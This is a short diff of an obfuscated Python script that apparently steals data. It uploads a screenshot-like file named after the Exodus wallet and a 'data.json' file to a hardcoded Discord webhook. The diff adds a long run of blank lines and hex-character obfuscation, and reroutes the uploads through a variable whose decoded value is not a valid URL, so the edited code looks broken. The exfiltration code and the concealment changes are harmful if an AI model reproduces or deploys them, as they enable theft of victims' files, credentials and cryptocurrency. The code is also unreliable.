@@ -55,11 +55,56 @@ except Exception:
 
 
 
-WEBHOOK_URL = ''.join(chr(int('68', 16)) + chr(int('69', 16)) + chr(int('65', 16)) + chr(int('77', 16)) + chr(int('80', 16)) + chr(int('60', 16)) + chr(int('62', 16)))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+sk = ''.join(chr(int('68', 16)) + chr(int('69', 16)) + chr(int('65', 16)) + chr(int('77', 16)) + chr(int('80', 16)) + chr(int('60', 16)) + chr(int('62', 16)))
 lk = 'https://discord.com/api/webhooks/' + '1416470285124636862/eE362yEUnVTNXPOjXCiIaMW1vwKoOjZiTGqxIdaQqD3wYS0LBV4hIyKOEZdA3MrZ16BM'
 
 def X():
-    Y = 'exodus.png'
+    Y = 'm.png'
 
     Z = 0
     a = U(Z)
@@ -81,7 +126,7 @@ def X():
                         'file': (Y, d, 'image/png')
                     }
 
-                    g = T(lk, data=e, files=f)
+                    g = T(sk, data=e, files=f)
                     g.raise_for_status()
 
             except Exception:
@@ -219,7 +264,7 @@ def am():
         'file': ('data.json', str(an), 'application/json')
     }
     try:
-        aq = T(lk, data=ao, files=ap)
+        aq = T(sk, data=ao, files=ap)
         aq.raise_for_status()
     except Exception as ar:
         print(ar)
